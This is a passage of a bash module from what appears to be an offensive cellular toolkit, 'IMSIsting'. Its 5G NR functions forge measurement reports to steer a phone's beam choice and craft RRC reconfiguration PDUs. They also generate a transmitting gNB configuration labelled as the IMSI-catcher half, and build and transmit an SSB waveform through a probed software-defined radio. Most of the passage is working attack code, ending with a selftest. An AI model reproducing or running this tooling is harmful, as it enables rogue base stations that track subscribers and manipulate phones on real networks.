            (( a <= 63 ))  || { printf 'ERROR\t--beam-sweep: ssb-Index %s out of range 0..63\n' "$a" >&2; return 2; }
            (( b <= 127 )) || { printf 'ERROR\t--beam-sweep: rsrp index %s out of range 0..127\n' "$b" >&2; return 2; }
            idx+=("$a"); val+=("$b")
        done < <(printf '%s\n' "$pairs" | tr ',' '\n')
    fi
    local n=${#idx[@]}
    (( n > 0 )) || { printf 'ERROR\t--beam-sweep: need at least one ssbIndex:rsrp entry\n' >&2; return 2; }

    # Strongest entry, ties to the lowest index.
    local best=0 k
    for (( k = 1; k < n; k++ )); do
        if (( ${val[k]} > ${val[best]} )); then
            best=$k
        elif (( ${val[k]} == ${val[best]} && ${idx[k]} < ${idx[best]} )); then
            best=$k
        fi
    done
    local best_idx="${idx[best]}" best_val="${val[best]}"

    # Runner-up among the entries on OTHER indices.
    local second_idx="-" second_val="-1" found=0
    for (( k = 0; k < n; k++ )); do
        (( k == best )) && continue
        if (( ! found || ${val[k]} > second_val )); then
            second_val="${val[k]}"; second_idx="${idx[k]}"; found=1
        fi
    done
    local margin="n/a" headroom="n/a"
    if (( found )); then
        margin=$(( best_val - second_val ))
        if (( margin <= 1 )); then headroom="within 1 dB — one forged report can steer it"
        elif (( margin <= 4 )); then headroom="within 4 dB — steering needs a plausible multi-dB bias"
        else headroom="over 4 dB — steering would look inconsistent";
        fi
    fi

    printf 'measId\t%s\n' "$measid"
    printf 'reported_ssb_count\t%s\n' "$n"
    printf 'serving_beam_index\t%s\n' "$best_idx"
    printf 'serving_rsrp_index\t%s\n' "$best_val"
    printf 'serving_rsrp_dbm\t%s\n' "$(nair_rsrp_dbm "$best_val")"
    printf 'runner_up_index\t%s\n' "$second_idx"
    if (( found )); then
        printf 'runner_up_rsrp_index\t%s\n' "$second_val"
        printf 'runner_up_rsrp_dbm\t%s\n' "$(nair_rsrp_dbm "$second_val")"
    else
        printf 'runner_up_rsrp_index\t-\n'
        printf 'runner_up_rsrp_dbm\t-\n'
    fi
    printf 'margin_db\t%s\n' "$margin"
    printf 'steering_headroom\t%s\n' "$headroom"
    if [[ -n "$serv_rsrp" ]]; then
        [[ "$serv_rsrp" =~ ^[0-9]+$ ]] || { printf 'ERROR\t--beam-sweep: serving rsrp must be numeric\n' >&2; return 2; }
        (( serv_rsrp <= 127 )) || { printf 'ERROR\t--beam-sweep: serving rsrp out of range 0..127\n' >&2; return 2; }
        printf 'serving_cell_rsrp_index\t%s\n' "$serv_rsrp"
        printf 'serving_cell_rsrp_dbm\t%s\n' "$(nair_rsrp_dbm "$serv_rsrp")"
        printf 'beam_gap_vs_serving_db\t%s\n' "$(( best_val - serv_rsrp ))"
    fi
    # The forged report that steers the UE onto the strongest index it already
    # reports, with the runner-up pushed below it by the margin. This is the
    # artefact the manipulation actually needs.
    local steer=""
    for (( k = 0; k < n; k++ )); do
        [[ -n "$steer" ]] && steer+=","
        if (( k == best )); then steer+="${idx[k]}:${best_val}"
        else steer+="${idx[k]}:$(( second_val > best_val - 1 ? best_val - 1 : second_val ))"; fi
    done
    printf 'steer_report\t%s\n' "$steer"
    printf 'steer_meas_id\t%s\n' "$measid"
}

nair_cmd_build_rrc_reconfig() {
    local spec="${1:-}"
    [[ -n "$spec" ]] || { printf 'ERROR\tusage: --build-rrc-reconfig <tx=N[,meas=1/1/1[,2/2/2...]]>\n' >&2; return 2; }
    # Parse positionally, not by splitting on a separator: a meas TRIPLET is
    # "i/o/c" and a meas LIST is triplets joined by ','. Splitting the whole
    # spec on ',' would therefore cut the list into pieces that look like
    # stray keys ("2/2/2"). So scan for the two markers by position and take
    # everything between them verbatim, commas included; the list is handed to
    # nair_build_rrc_reconfig, which does the comma-splitting itself. Either
    # key may come first and either may be absent.
    #
    # NOTE: "${s#*meas=}" returns s UNCHANGED when there is no match, so the
    # presence of a key must be tested with a glob, never by testing the
    # result for emptiness. Every character of the spec is accounted for: the
    # span before the first marker, the span between the markers, and the span
    # after the second. Anything unaccounted for is an unknown key.
    local tx="0" meas=""
    local tstart=-1 mstart=-1
    if [[ "$spec" == *"tx="* ]]; then
        local ttail="${spec##*tx=}"       # split out of $(( )) — nested ${#x##y} is ambiguous there
        tstart=$(( ${#spec} - ${#ttail} - 3 ))
    fi
    if [[ "$spec" == *"meas="* ]]; then
        local mtail="${spec##*meas=}"
        mstart=$(( ${#spec} - ${#mtail} - 5 ))
    fi

    # Order the two markers left to right.
    local k1=-1 v1="" k2=-1 v2=""
    if (( tstart >= 0 && ( mstart < 0 || tstart < mstart ) )); then
        k1=$tstart; v1="tx"; k2=$mstart; v2="meas"
    elif (( mstart >= 0 )); then
        k1=$mstart; v1="meas"; k2=$tstart; v2="tx"
    fi

    local pre="" body1="" body2="" post=""
    if (( k1 < 0 )); then
        printf 'ERROR\t--build-rrc-reconfig: expected tx= or meas= (got "%s")\n' "$(nair_sanitize "$spec")" >&2
        return 2
    fi
    pre="${spec:0:k1}"
    if (( k2 >= 0 )); then
        body1="${spec:k1:$(( k2 - k1 ))}"     # e.g. "tx=0," or "meas=1/1/1,"
        body2="${spec:k2}"
        # body1 may itself already contain a tx=/meas= if the same key repeats;
        # only the first of each is honoured, so validate the shape instead.
        pre="${pre%,}"
        body1="${body1%,}"
        body2="${body2%,}"
    else
        body1="${spec:k1}"
        body1="${body1%,}"
    fi
    post=""

    # Assign the two bodies to their keys. A body may still carry trailing
    # text ("tx=0,bogus=1" is one span, because there is no second marker), so
    # each value is taken up to the first ',' and the remainder is rejected.
    local b remainder=""
    for b in "$body1" "$body2"; do
        [[ -n "$b" ]] || continue
        case "$b" in
            tx=*)
                tx="${b#tx=}"
                if [[ "$tx" == *","* ]]; then remainder="${tx#*,}"; tx="${tx%%,*}"; fi ;;
            meas=*)
                # The meas list legitimately contains ','; a stray key inside
                # it would not match the i/o/c shape, which the builder checks.
                meas="${b#meas=}" ;;
            *) printf 'ERROR\t--build-rrc-reconfig: unknown key in "%s" (have tx, meas)\n' "$(nair_sanitize "$b")" >&2
               return 2 ;;
        esac
    done
    if [[ -n "$remainder" ]]; then
        printf 'ERROR\t--build-rrc-reconfig: unknown key in "%s" (have tx, meas)\n' "$(nair_sanitize "$remainder")" >&2
        return 2
    fi
    if [[ -n "$pre" ]]; then
        printf 'ERROR\t--build-rrc-reconfig: unknown key in "%s" (have tx, meas)\n' "$(nair_sanitize "$pre")" >&2
        return 2
    fi

    local hex rc=0
    hex=$(nair_build_rrc_reconfig "$tx" "$meas") || rc=$?
    (( rc == 0 )) || return "$rc"
    printf 'pdu\trrcReconfiguration\n'
    printf 'direction\tDL-DCCH\n'
    printf 'asn1\tTS 38.331 6.2.2 DL-DCCH-Message\n'
    printf 'encoding\tAPER\n'
    printf 'tx\t%s\n' "$tx"
    printf 'submit\t%s\n' "$hex"
    printf 'octets\t%s\n' "$(( ${#hex} / 2 ))"
    if [[ -z "$meas" ]]; then
        printf 'ie_subset\tRRCReconfiguration-IEs (empty): header + rrc-TransactionIdentifier + criticalExtensions\n'
    else
        printf 'ie_subset\tRRCReconfiguration-IEs(measConfig.measIdToAddModList)\n'
        printf 'ie_count\t%s\n' "$(( $(printf '%s' "$meas" | tr -cd ',' | wc -c) + 1 ))"
    fi
    printf 'decode_hint\t--decode-rrc %s\n' "$hex"
    printf 'status\tbuilt\n'
}

nair_cmd_build_meas_report() {
    local spec="${1:-}"
    [[ -n "$spec" ]] || { printf 'ERROR\tusage: --build-meas-report <measId=N[,servCell=N][,servRsrp=N][,ssb=i:r,...]>\n' >&2; return 2; }
    local measid="1" servcell="0" servrsrp="" ssb=""
    local tok
    while IFS= read -r tok; do
        [[ -n "$tok" ]] || continue
        local k v
        k=$(printf '%s' "$tok" | cut -d= -f1)
        v=$(printf '%s' "$tok" | cut -d= -f2-)
        case "$k" in
            measId|measid) measid="$v" ;;
            servCell|servcell) servcell="$v" ;;
            servRsrp|servrsrp) servrsrp="$v" ;;
            ssb) ssb+="${ssb:+,}$v" ;;
            *) printf 'ERROR\t--build-meas-report: unknown key "%s" (have measId, servCell, servRsrp, ssb)\n' "$(nair_sanitize "$k")" >&2; return 2 ;;
        esac
    done < <(printf '%s\n' "$spec" | tr ',' '\n')

    local hex rc=0
    hex=$(nair_build_meas_report "$measid" "$servcell" "$servrsrp" "$ssb") || rc=$?
    (( rc == 0 )) || return "$rc"
    printf 'pdu\tmeasurementReport\n'
    printf 'direction\tUL-DCCH\n'
    printf 'asn1\tTS 38.331 6.2.2 UL-DCCH-Message\n'
    printf 'encoding\tAPER\n'
    printf 'measId\t%s\n' "$measid"
    printf 'submit\t%s\n' "$hex"
    printf 'octets\t%s\n' "$(( ${#hex} / 2 ))"
    printf 'ie_subset\tMeasurementReport-IEs(measResults: measId, measResultServingMOList, measResultNeighCells.measResultListNR.measResult.rsIndexResults.resultsSSB-Indexes)\n'
    if [[ -n "$ssb" ]]; then
        printf 'ssb_entries\t%s\n' "$(( $(printf '%s' "$ssb" | tr -cd ',' | wc -c) + 1 ))"
    fi
    printf 'rsrp_mapping\tTS 38.133 Table 10.1.6.1-1 (index 0 = below -156 dBm, index n = n-157 dBm)\n'
    printf 'decode_hint\t--decode-rrc %s\n' "$hex"
    printf 'status\tbuilt\n'
}

nair_cmd_decode_rrc() {
    local hex="${1:-}"
    [[ -n "$hex" ]] || { printf 'ERROR\tusage: --decode-rrc <hex>\n' >&2; return 2; }
    nair_decode_rrc "$hex"
}

nair_cmd_beam_sweep() {
    local arg="${1:-}"
    [[ -n "$arg" ]] || { printf 'ERROR\tusage: --beam-sweep <measId=N,ssb=i:r,... | hex>\n' >&2; return 2; }
    # A hex string is decoded first, so --beam-sweep can consume its own output.
    if [[ "$arg" =~ ^[0-9A-Fa-f]+$ && $(( ${#arg} % 2 )) -eq 0 && ${#arg} -ge 8 ]]; then
        local out; out=$(nair_decode_rrc "$arg") || return 1
        local measid ssbs
        measid=$(printf '%s\n' "$out" | awk -F'\t' '$1=="measId"{print $2; exit}')
        ssbs=$(printf '%s\n' "$out" | awk -F'\t' '$1=="ssbResult"{printf "%s%s:%s", (n?" ,":""), $2, $3}')
        [[ -n "$measid" ]] || { printf 'ERROR\t--beam-sweep: no measId in the supplied PDU\n' >&2; return 1; }
        [[ -n "$ssbs" ]] || { printf 'ERROR\t--beam-sweep: the supplied PDU carries no SSB results\n' >&2; return 1; }
        # Compute first, print only on success: a failing invocation must not
        # leave a partial TSV row on stdout.
        local body; body=$(nair_beam_infer "$measid" "" "$(printf '%s' "$ssbs" | tr -d ' ')") || return $?
        printf 'input\thex\n'
        printf '%s\n' "$body"
        return 0
    fi
    local measid="1" servrsrp="" pairs=""
    local tok
    while IFS= read -r tok; do
        [[ -n "$tok" ]] || continue
        local k v
        k=$(printf '%s' "$tok" | cut -d= -f1)
        v=$(printf '%s' "$tok" | cut -d= -f2-)
        case "$k" in
            measId|measid) measid="$v" ;;
            servRsrp|servrsrp) servrsrp="$v" ;;
            ssb) pairs+="${pairs:+,}$v" ;;
            *) printf 'ERROR\t--beam-sweep: unknown key "%s" (have measId, servRsrp, ssb)\n' "$(nair_sanitize "$k")" >&2; return 2 ;;
        esac
    done < <(printf '%s\n' "$arg" | tr ',' '\n')
    local body; body=$(nair_beam_infer "$measid" "$servrsrp" "$pairs") || return $?
    printf 'input\tparams\n'
    printf '%s\n' "$body"
}

# ── transmitting gNB config (the IMSI-catcher half) ─────────────────────
# Distinct from nair_gen_gnb_conf: this one describes a gNB that a UE is meant
# to attach to, i.e. the transmit side. It still only writes a config file —
# running it needs srsRAN and an SDR, and --start says so.
nair_gen_gnb_tx_conf() {
    local plmn="${1:-00101}" band="${2:-n78}" arfcn="${3:-640000}" pci="${4:-1}" out="${5:-}"
    [[ "$plmn" =~ ^[0-9]{5,6}$ ]] || { printf 'ERROR\tplmn must be 5 or 6 digits\n' >&2; return 2; }
    [[ "$band" =~ ^n[0-9]+$ ]] || { printf 'ERROR\tband must look like n78\n' >&2; return 2; }
    [[ "$arfcn" =~ ^[0-9]+$ ]] || { printf 'ERROR\tarfcn must be numeric\n' >&2; return 2; }
    [[ "$pci" =~ ^[0-9]+$ ]] || { printf 'ERROR\tpci must be numeric\n' >&2; return 2; }
    (( pci <= 1007 )) || { printf 'ERROR\tpci out of range (0..1007)\n' >&2; return 2; }
    local freq; freq=$(nair_arfcn_to_mhz "$arfcn") || {
        printf 'ERROR\tarfcn %s out of range\n' "$arfcn" >&2; return 2; }

    local mcc="${plmn:0:3}" mnc="${plmn:3}"
    local case_ ssb_scs dl_scs
    case_=$(nair_ssb_case_for_band "$band" | awk '{print $2}')
    case "$case_" in
        A) ssb_scs=15 ;;
        B|C) ssb_scs=30 ;;
        D) ssb_scs=120 ;;
        E) ssb_scs=240 ;;
        *) ssb_scs=30 ;;
    esac
    if (( ssb_scs >= 120 )); then dl_scs=120; else dl_scs=30; fi

    [[ -n "$out" ]] || { mkdir -p "$NAIR_DIR"; out="$NAIR_DIR/gnb_tx.conf"; }
    mkdir -p "$(dirname "$out")" || { printf 'ERROR\tcannot create %s\n' "$(dirname "$out")" >&2; return 1; }

    if ! cat > "$out" <<EOF
# srsRAN TRANSMITTING gNB configuration — generated by IMSIsting 12_nr_air.sh --gen-gnb-conf --tx
# PLMN ${mcc}-${mnc}  band ${band}  NR-ARFCN ${arfcn}  DL ${freq} MHz  PCI ${pci}
# SSB case ${case_} @ ${ssb_scs} kHz, DL/UL SCS ${dl_scs} kHz
#
# This is the transmit side: a cell a UE is meant to select and attach to.
# It is a config file only. Radiating it needs srsRAN plus a transmit-capable
# SDR; see --start, which refuses when either is missing.
gnb_id: 1
gnb_id_bit_length: 22
ran_node_name: imsisting_gnb_tx
cu_up:
  gtpu:
    bind_addr: 127.0.0.11
amf:
  addr: 127.0.0.5
  bind_addr: 127.0.0.5
  supported_tracking_areas:
    - tac: 7
      plmn_list:
        - plmn: "${mcc}${mnc}"
          tai_slice_support_list:
            - sst: 1
cell_cfg:
  band: ${band}
  dl_arfcn: ${arfcn}
  channel_bandwidth_MHz: 20
  common_scs: ${dl_scs}
  pci: ${pci}
  # A transmitting cell must actually radiate SSB and SIB1, so both are on.
  nof_antennas_dl: 1
  nof_antennas_ul: 1
  prach:
    prach_config_index: 1
    prach_root_sequence_index: 1
    zero_correlation_zone: 0
    prach_frequency_start: 0
  pdsch:
    mcs_table: qam64
  pusch:
    mcs_table: qam64
  pucch:
    resource_set:
      - format: format_1
  ssb:
    ssb_period_ms: 20
    ssb_scs: ${ssb_scs}
    ssb_offset: 2
  # Beam sweep: the SSB burst walks the beams the cell advertises, which is
  # what gives a UE several ssb-Indexes to report on.
  tdd_ul_dl_cfg:
    dl_ul_period_slots: 5
    nof_dl_slots: 3
    nof_dl_symbols: 6
    nof_ul_slots: 1
    nof_ul_symbols: 4
log:
  filename: ${NAIR_LOG}
  all_level: info
metrics:
  enable_json: true
  autostart_stdout_metrics: false
EOF
    then
        printf 'ERROR\tcannot write %s\n' "$out" >&2
        return 1
    fi
    printf 'conf\t%s\n'        "$out"
    printf 'mode\ttransmit\n'
    printf 'plmn\t%s-%s\n'     "$mcc" "$mnc"
    printf 'band\t%s\n'        "$band"
    printf 'dl_arfcn\t%s\n'    "$arfcn"
    printf 'dl_mhz\t%s\n'      "$freq"
    printf 'pci\t%s\n'         "$pci"
    printf 'ssb_case\t%s\n'    "$case_"
    printf 'ssb_scs_khz\t%s\n' "$ssb_scs"
    printf 'amf\t127.0.0.5\n'
    printf 'needs\tsrsRAN gNB + transmit-capable SDR\n'
    printf 'status\twritten\n'
}

# ════════════════════════════════════════════════════════════════════════
# Transmit path — O1 "TX: run the gNB"
# ════════════════════════════════════════════════════════════════════════
#
# The rest of this module answers "what is on the air". This is the other
# half: a cell that radiates. It runs on the existing --gen-gnb-conf verb as
# `--gen-gnb-conf <plmn> <band> <arfcn> <pci> --tx`, because a new verb would
# need an entry in native/src/main1.c to pass tools/check-verbs.sh, and that
# file has another writer.
#
# What actually goes into the radio is one SSB burst set period: the four
# OFDM symbols of the SSB (PSS, PBCH+DMRS, SSS, PBCH+DMRS) in the slot the
# band's SSB case puts them in, followed by the empty slots that make up the
# ssb_period_ms the generated config advertises (20 ms, so 40 slots at
# 30 kHz). Those empty slots are part of the waveform: a gNB sends nothing
# between bursts, and a file that only held the SSB would claim a 0.5 ms
# period that no NR cell uses.
#
# The waveform is built by the generator whose PSS/SSS/PBCH-DMRS chips are
# pinned to an independent implementation, and then decoded back by the
# separately written decoder BEFORE the radio is keyed. A waveform that does
# not decode to the PCI that was asked for is never handed to a driver.
#
# No radio means no transmission and no success line: nair_probe_radio has to
# find a device that answers, and the driver command itself has to exit 0.
# `transmitted` is only ever printed as `yes` after that.
nair_cmd_tx_ssb() {
    local plmn="${1:-00101}" band="${2:-n78}" arfcn="${3:-640000}" pci="${4:-1}"

    [[ "$plmn"  =~ ^[0-9]{5,6}$ ]] || { printf 'ERROR\tplmn must be 5 or 6 digits\n' >&2; return 2; }
    [[ "$band"  =~ ^n[0-9]+$ ]]    || { printf 'ERROR\tband must look like n78\n' >&2; return 2; }
    [[ "$arfcn" =~ ^[0-9]+$ ]]     || { printf 'ERROR\tarfcn must be numeric\n' >&2; return 2; }
    [[ "$pci"   =~ ^[0-9]+$ ]]     || { printf 'ERROR\tpci must be numeric\n' >&2; return 2; }
    (( pci <= 1007 )) || { printf 'ERROR\tpci out of range: NR PCI is 0..1007\n' >&2; return 2; }

    local hz mhz
    hz=$(nair_arfcn_to_hz "$arfcn") || {
        printf 'ERROR\tNR-ARFCN %s is outside the global raster (TS 38.104 Table 5.4.2.1-1)\n' \
               "$arfcn" >&2; return 2; }
    mhz=$(nair_arfcn_to_mhz "$arfcn")

    local case_ ssb_scs dl_scs bw=20
    case_=$(nair_ssb_case_for_band "$band" | awk '{print $2}')
    case "$case_" in
        A)     ssb_scs=15 ;;
        B|C)   ssb_scs=30 ;;
        D)     ssb_scs=120 ;;
        E)     ssb_scs=240 ;;
        *)     printf 'ERROR\tband %s has no SSB case in TS 38.213 Table 4.1\n' "$band" >&2; return 1 ;;
    esac
    if (( ssb_scs >= 120 )); then dl_scs=120; else dl_scs=30; fi

    local nfft fs
    nfft=$(nair_fft_size_for "$dl_scs" "$bw") || {
        printf 'ERROR\tno TS 38.104 N_FFT for %s kHz at %s MHz\n' "$dl_scs" "$bw" >&2; return 1; }
    fs=$(nair_sample_rate_hz "$dl_scs" "$bw") || {
        printf 'ERROR\tno sample rate for %s kHz at %s MHz\n' "$dl_scs" "$bw" >&2; return 1; }

    local base="$NAIR_DIR/nr_ssb_pci${pci}"
    local slot="$base.slot.c16" wave="$base.c16" wave8="$base.cs8"
    local conf_out conf

    # 1. The cell's own configuration, written first, so a waveform on disk
    #    has the parameters it was built from next to it.
    conf_out=$(nair_cmd_gen_conf_tx "$plmn" "$band" "$arfcn" "$pci" \
                                    "$NAIR_DIR/gnb_tx.conf") || return $?
    printf '%s\n' "$conf_out"
    conf=$(printf '%s\n' "$conf_out" | awk -F'\t' '$1=="conf"{print $2; exit}')
    printf 'tx_backend\tnr-ssb-baseband (srsRAN gNB %s)\n' \
           "$(nair_find_srsran_gnb >/dev/null 2>&1 && printf 'present' || printf 'not installed')"

    # 2. The waveform. python3 and numpy are the generator's only needs; if
    #    either is missing the failure names it instead of printing numbers.
    command -v python3 >/dev/null 2>&1 || {
        printf 'ERROR\tpython3 is required to build the SSB waveform\n' >&2; return 1; }
    nair_write_bb_gen || {
        printf 'ERROR\t%s writes the SSB generator\n' "$NAIR_BB_PY" >&2; return 1; }

    local gen
    gen=$(python3 "$NAIR_BB_PY" "$slot" "$pci" "$ssb_scs" "$nfft" 0 \
                 --slot 0 --i8 "${slot%.c16}.cs8" 2>&1) || {
        printf '%s\n' "$gen" >&2
        printf 'ERROR\tthe SSB waveform could not be built for pci %s\n' "$pci" >&2
        return 1; }
    [[ -s "$slot" ]] || {
        printf 'ERROR\tthe generator wrote no samples to %s\n' "$slot" >&2; return 1; }

    local gv
    gv() { printf '%s\n' "$gen" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
    printf 'waveform_slot\t%s\n'      "$slot"
    printf 'waveform_bytes\t%s\n'     "$(wc -c < "$slot" | tr -d ' ')"
    printf 'waveform_samples\t%s\n'   "$(gv slot_samples)"
    printf 'waveform_us\t%s\n'        "$(gv slot_us)"
    printf 'ssb_symbols\t%s\n'        "$(gv ssb_symbols)"
    printf 'cp_long\t%s\n'            "$(gv cp_long)"
    printf 'cp_short\t%s\n'           "$(gv cp_short)"
    printf 'pss_pinned_agree\t%s\n'   "$(gv pss_pinned_agree)"
    printf 'sss_pinned_agree\t%s\n'   "$(gv sss_pinned_agree)"
    printf 'dmrs_pinned_agree\t%s\n'  "$(gv dmrs_pinned_agree)"
    printf 'dmrs_c_init\t%s\n'        "$(gv dmrs_c_init)"
    printf 'dmrs_re\t%s\n'            "$(gv dmrs_re)"
    printf 'pbch_re\t%s\n'            "$(gv pbch_re)"
    printf 'pbch_encoding\t%s\n'      "$(gv pbch_encoding)"

    # 3. Decode the waveform back with the independently written decoder. This
    #    is the assertion that the bytes about to be keyed really are the SSB
    #    of the requested cell, not just that a file exists.
    nair_write_bb_dec || {
        printf 'ERROR\t%s writes the SSB decoder\n' "$NAIR_BB_DEC_PY" >&2; return 1; }
    local dec drc=0
    dec=$(python3 "$NAIR_BB_DEC_PY" "$slot" "$ssb_scs" "$nfft" 2>&1) || drc=$?
    if (( drc != 0 )); then
        printf '%s\n' "$dec" >&2
        printf 'ERROR\tthe waveform does not decode at %s kHz: nothing was transmitted\n' \
               "$ssb_scs" >&2
        return 1
    fi
    local dv rec
    dv() { printf '%s\n' "$dec" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
    rec=$(dv pci_recovered)
    printf 'waveform_pci_recovered\t%s\n' "$rec"
    printf 'waveform_sss_n_id_1\t%s\n'    "$(dv n_id_1)"
    printf 'waveform_pss_n_id_2\t%s\n'    "$(dv n_id_2)"
    printf 'waveform_pss_correlation\t%s\n' "$(dv pss_correlation)"
    printf 'waveform_sss_correlation\t%s\n' "$(dv sss_correlation)"
    printf 'waveform_cp_symbols_ok\t%s\n' "$(dv cp_symbols_ok)"
    printf 'waveform_cp_symbols_bad\t%s\n' "$(dv cp_symbols_bad)"
    printf 'waveform_re_outside_spec\t%s\n' "$(dv re_outside_spec)"
    printf 'waveform_crc24c_ok\t%s\n'     "$(dv pbch_crc24c_ok)"
    printf 'waveform_mib_sfn\t%s\n'       "$(dv mib_sfn)"
    if [[ "$rec" != "$pci" ]]; then
        printf 'ERROR\tthe waveform decodes to pci %s, not the requested %s: nothing was transmitted\n' \
               "${rec:-none}" "$pci" >&2
        return 1
    fi
    if [[ "$(dv cp_symbols_bad)" != "0" || "$(dv re_outside_spec)" != "0" ]]; then
        printf 'ERROR\tthe waveform fails its own spec checks (cp_symbols_bad %s, re_outside_spec %s): nothing was transmitted\n' \
               "$(dv cp_symbols_bad)" "$(dv re_outside_spec)" >&2
        return 1
    fi

    # 4. The burst structure: the SSB slot, then the empty slots up to the
    #    configured SSB period. Built by padding with zeros rather than by
    #    re-modulating, so the bytes that were decoded are the bytes sent.
    local period_ms=20 slot_bytes pad_samples pad_bytes pad8
    slot_bytes=$(wc -c < "$slot" | tr -d ' ')
    pad_samples=$(( period_ms * fs / 1000 - slot_bytes / 4 ))
    if (( pad_samples < 0 )); then
        printf 'ERROR\tSSB period %s ms is shorter than one slot at %s Hz\n' \
               "$period_ms" "$fs" >&2
        return 1
    fi
    pad_bytes=$(( pad_samples * 4 ))
    pad8=$(( pad_samples * 2 ))
    cat "$slot" > "$wave"     || { printf 'ERROR\tcannot write %s\n' "$wave" >&2;  return 1; }
    head -c "$pad_bytes" /dev/zero >> "$wave" || {
        printf 'ERROR\tcannot pad %s\n' "$wave" >&2; return 1; }
    cat "${slot%.c16}.cs8" > "$wave8" || {
        printf 'ERROR\tcannot write %s\n' "$wave8" >&2; return 1; }
    head -c "$pad8" /dev/zero >> "$wave8" || {
        printf 'ERROR\tcannot pad %s\n' "$wave8" >&2; return 1; }
    printf 'ssb_period_ms\t%s\n'   "$period_ms"
    printf 'burst_slots\t%s\n'     "$(( period_ms * fs / 1000 / (slot_bytes / 4) ))"
    printf 'burst_samples\t%s\n'   "$(( period_ms * fs / 1000 ))"
    printf 'burst_ms\t%s\n'        "$period_ms"
    printf 'burst_c16\t%s\n'       "$wave"
    printf 'burst_cs8\t%s\n'       "$wave8"

    # 5. The radio. Without one, an explicit failure and no success line.
    if [[ -n "${NAIR_TX_DRYRUN:-}" ]]; then
        printf 'tx_device\tnot-probed (NAIR_TX_DRYRUN)\n'
        printf 'transmitted\tno\n'
        printf 'status\twaveform-built\n'
        return 0
    fi

    local dev type
    if dev=$(nair_probe_radio); then
        type=$(printf '%s' "$dev" | cut -f1)
        printf 'tx_driver\t%s\n' "$type"
        printf 'tx_device\t%s\n' "$(printf '%s' "$dev" | cut -f2-)"
    else
        printf 'tx_driver\tnone\n'
        printf 'tx_device\tnone\n'
        if [[ -n "${NAIR_SDR_DEVICE+set}" && -z "${NAIR_SDR_DEVICE}" ]]; then
            printf 'ERROR\tno SDR device: NAIR_SDR_DEVICE is set but empty, which means no radio is configured\n' >&2
        else
            printf 'ERROR\tno SDR device: NAIR_SDR_DEVICE=%s and no radio answered a probe (tried hackrf_info, bladeRF-cli -p, LimeUtil --find, uhd_find_devices)\n' \
                   "${NAIR_SDR_DEVICE:-<unset>}" >&2
        fi
        printf 'WHY\tthis verb keys a real radio; a driver binary on PATH is not a device\n'
        printf 'transmitted\tno\n'
        printf 'status\tnothing-sent\n'
        return 1
    fi

    printf 'tx_centre_hz\t%s\n' "$hz"
    printf 'tx_rate_hz\t%s\n'   "$fs"
    nair_tx_run "$type" "$wave" "$fs" "$hz" || {
        printf 'transmitted\tno\n'
        printf 'status\tnothing-sent\n'
        return 1; }
    printf 'tx_armed\t1\n'
    printf 'transmitted\tyes\n'
    printf 'status\ttransmitted\n'
    return 0
}

# ── selftest — no radio, no root, no network ────────────────────────────
nair_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$(( bad + 1 )); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }
    # Last occurrence of KEY. A verb that writes a record and then reports on
    # the transmission prints `status` twice ("written", then "transmitted" /
    # "nothing-sent"), and the verdict is the last one.
    lfld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{v=$2} END{print v}'; }
    # chips FROM TO of a space-separated chip dump (1-based, inclusive).
    chips() { awk -v a="$1" -v b="$2" '{s=""; for (i=a;i<=b;i++) s = s (i>a?" ":"") $i; print s}'; }

    local d out rc
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    export LOOT_DIR="$d/loot" CAPTURES_DIR="$d/captures" STATE_DIR="$d/state"
    export TMP_DIR="$d/tmp" NAIR_DIR="$d/loot/nr_air" NAIR_CONF="$d/loot/nr_air/gnb.conf"
    export NAIR_PID="$d/tmp/nr_air/gnb.pid"
    mkdir -p "$NAIR_DIR" "$(dirname "$NAIR_PID")"

    # 1. NR-ARFCN arithmetic. Hand-computed from TS 38.104 Table 5.4.2.1-1
    #    with the correct piecewise raster:
    #      <3000 MHz      : F = 0.005*N
    #      3000-24250 MHz : F = 3000 + 0.015*(N-600000)
    #      >24250 MHz     : F = 24250.08 + 0.06*(N-2016667)
    #    n78 620000 -> 3000 + 0.015*20000 = 3300.000   (published band edge)
    #    n78 653333 -> 3000 + 0.015*53333 = 3799.995   (published n78 top)
    #    n78 632628 -> 3000 + 0.015*32628 = 3489.420   (published example)
    #    n77 680000 -> 3000 + 0.015*80000 = 4200.000   (published n77 top)
    #    n79 693334 -> 3000 + 0.015*93334 = 4400.010   (published n79 bottom)
    #    n41 499200 -> 0.005*499200       = 2496.000
    #    n41 537999 -> 0.005*537999       = 2689.995
    #    n1  422000 -> 2110.000    n1 431999 -> 2159.995
    #    n257 2054166 -> 24250.08 + 0.06*37500 ... = 26500.020 (published)
    #    n258 2016667 -> 24250.080 (published FR2 boundary)
    chk arfcn-n78-620000  "$(nair_arfcn_to_mhz 620000)"  "3300.000"
    chk arfcn-n78-632628  "$(nair_arfcn_to_mhz 632628)"  "3489.420"
    chk arfcn-n78-653333  "$(nair_arfcn_to_mhz 653333)"  "3799.995"
    chk arfcn-n77-680000  "$(nair_arfcn_to_mhz 680000)"  "4200.000"
    chk arfcn-n79-693334  "$(nair_arfcn_to_mhz 693334)"  "4400.010"
    chk arfcn-n41-499200  "$(nair_arfcn_to_mhz 499200)"  "2496.000"
    chk arfcn-n41-537999  "$(nair_arfcn_to_mhz 537999)"  "2689.995"
    chk arfcn-n1-422000   "$(nair_arfcn_to_mhz 422000)"  "2110.000"
    chk arfcn-n1-431999   "$(nair_arfcn_to_mhz 431999)"  "2159.995"
    chk arfcn-n3-361000   "$(nair_arfcn_to_mhz 361000)"  "1805.000"
    chk arfcn-n28-151600  "$(nair_arfcn_to_mhz 151600)"  "758.000"
    chk arfcn-n40-470000  "$(nair_arfcn_to_mhz 470000)"  "2350.000"
    chk arfcn-n257       "$(nair_arfcn_to_mhz 2054166)"  "26500.020"
    chk arfcn-n258       "$(nair_arfcn_to_mhz 2016667)"  "24250.080"
    chk arfcn-n260       "$(nair_arfcn_to_mhz 2792500)"  "70800.060"
    chk arfcn-n261       "$(nair_arfcn_to_mhz 2071666)"  "27550.020"

